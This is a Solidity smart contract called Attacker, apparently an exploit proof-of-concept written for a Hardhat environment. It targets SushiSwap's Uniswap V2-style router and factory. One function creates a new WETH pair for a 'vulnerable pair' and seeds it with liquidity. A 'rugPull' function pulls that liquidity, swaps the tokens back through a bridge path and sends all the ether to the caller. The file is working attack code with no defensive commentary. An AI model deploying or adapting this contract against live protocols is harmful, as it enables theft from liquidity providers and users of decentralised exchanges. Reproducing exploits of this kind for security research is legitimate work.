pragma solidity >=0.8.0;
import "hardhat/console.sol";
import "../interfaces/IUniswapV2Router02.sol";
import "../interfaces/IUniswapV2Pair.sol";
import "../interfaces/IUniswapV2Factory.sol";
import "../interfaces/IWETH.sol";
import "../interfaces/IERC20.sol";

contract Attacker {
    IUniswapV2Router02 public immutable sushiRouter;
    IUniswapV2Factory public immutable sushiFactory;
    IWETH public constant WETH =
        IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(
        IUniswapV2Router02 _sushiRouter,
        IUniswapV2Factory _sushiFactory
    ) {
        sushiRouter = _sushiRouter;
        sushiFactory = _sushiFactory;
    }

    function createAndProvideLiquidity(
        IERC20 wethBridgeToken,
        IERC20 nonWethBridgeToken
    ) external payable returns (IUniswapV2Pair pair) {
        // first acquire both tokens for vulnerable pair
        // we assume one token of the pair has a WETH pair
        // trade ether to this token
        // trade token/2 to other pair token
        WETH.deposit{value: msg.value}();
        WETH.approve(address(sushiRouter), msg.value);
        address[] memory path = new address[](3);
        path[0] = address(WETH);
        path[1] = address(wethBridgeToken);
        path[2] = address(nonWethBridgeToken);
        uint256[] memory swapAmounts =
            sushiRouter.swapExactTokensForTokens(
                msg.value / 2,
                0,
                path,
                address(this),
                type(uint256).max
            );
        uint256 nonWethBridgeAmount = swapAmounts[2];

        // create pair
        pair = IUniswapV2Pair(
            sushiFactory.createPair(address(nonWethBridgeToken), address(WETH))
        );

        // add liquidity
        nonWethBridgeToken.approve(address(sushiRouter), nonWethBridgeAmount);
        sushiRouter.addLiquidity(
            address(WETH),
            address(nonWethBridgeToken),
            msg.value / 2, // rest of WETH
            swapAmounts[2], // all tokens we received
            0,
            0,
            address(this),
            type(uint256).max
        );
    }

    function rugPull(IUniswapV2Pair wethPair, IERC20 wethBridgeToken)
        external
        payable
    {
        IERC20 otherToken = IERC20(wethPair.token0());
        if (otherToken == WETH) {
            otherToken = IERC20(wethPair.token1());
        }
        uint256 lpToWithdraw = wethPair.balanceOf(address(this));
        wethPair.approve(address(sushiRouter), lpToWithdraw);
        sushiRouter.removeLiquidity(
            address(WETH),
            address(otherToken),
            lpToWithdraw,
            0,
            0,
            address(this),
            type(uint256).max
        );

        uint256 otherTokenBalance = otherToken.balanceOf(address(this));
        otherToken.approve(address(sushiRouter), otherTokenBalance);
        address[] memory path = new address[](3);
        path[0] = address(otherToken);
        path[1] = address(wethBridgeToken);
        path[2] = address(WETH);
        
        uint256[] memory swapAmounts =
            sushiRouter.swapExactTokensForTokens(
                otherTokenBalance,
                0,
                path,
                address(this),
                type(uint256).max
            );

        WETH.withdraw(swapAmounts[2]);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "final transfer failed");
    }

     receive() external payable {}
}
